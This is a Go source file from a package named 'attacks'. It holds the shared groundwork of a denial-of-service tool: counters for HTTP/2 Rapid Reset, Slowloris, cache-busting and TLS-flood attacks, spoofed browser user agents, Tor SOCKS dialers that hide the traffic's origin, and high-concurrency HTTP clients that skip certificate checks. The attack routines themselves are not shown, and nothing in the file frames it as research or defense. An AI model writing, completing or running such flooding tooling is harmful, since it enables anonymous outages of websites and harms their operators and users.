package attacks

import (
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"sync/atomic"
	"time"

	"golang.org/x/net/proxy"
)

type Stats struct {
	RapidReset int64
	Slowloris  int64
	CacheBust  int64
	TLSFlood   int64
	Total      int64
	Errors     int64
}

func (s *Stats) Add(field *int64) {
	atomic.AddInt64(field, 1)
	atomic.AddInt64(&s.Total, 1)
}

func (s *Stats) Snapshot() (rr, sl, cb, tls, total, errs int64) {
	return atomic.LoadInt64(&s.RapidReset),
		atomic.LoadInt64(&s.Slowloris),
		atomic.LoadInt64(&s.CacheBust),
		atomic.LoadInt64(&s.TLSFlood),
		atomic.LoadInt64(&s.Total),
		atomic.LoadInt64(&s.Errors)
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
}

func randomUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func makeSocksDialer(socksPort int) proxy.Dialer {
	d, err := proxy.SOCKS5("tcp", fmt.Sprintf("127.0.0.1:%d", socksPort), nil, proxy.Direct)
	if err != nil {
		return proxy.Direct
	}
	return d
}

func makeH2Client(torPort int) *http.Client {
	dialer := makeSocksDialer(torPort)
	return &http.Client{
		Transport: &http.Transport{
			DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				return dialer.Dial(network, addr)
			},
			ForceAttemptHTTP2:     true,
			TLSHandshakeTimeout:   5 * time.Second,
			ResponseHeaderTimeout: 3 * time.Second,
			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
			MaxIdleConnsPerHost:   300,
		},
		Timeout: 5 * time.Second,
	}
}

func makeH1Client(torPort int) *http.Client {
	dialer := makeSocksDialer(torPort)
	return &http.Client{
		Transport: &http.Transport{
			DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				return dialer.Dial(network, addr)
			},
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 10 * time.Second,
	}
}

func pickPort(ports []int) int {
	if len(ports) == 0 {
		return 9050
	}
	return ports[rand.Intn(len(ports))]
}
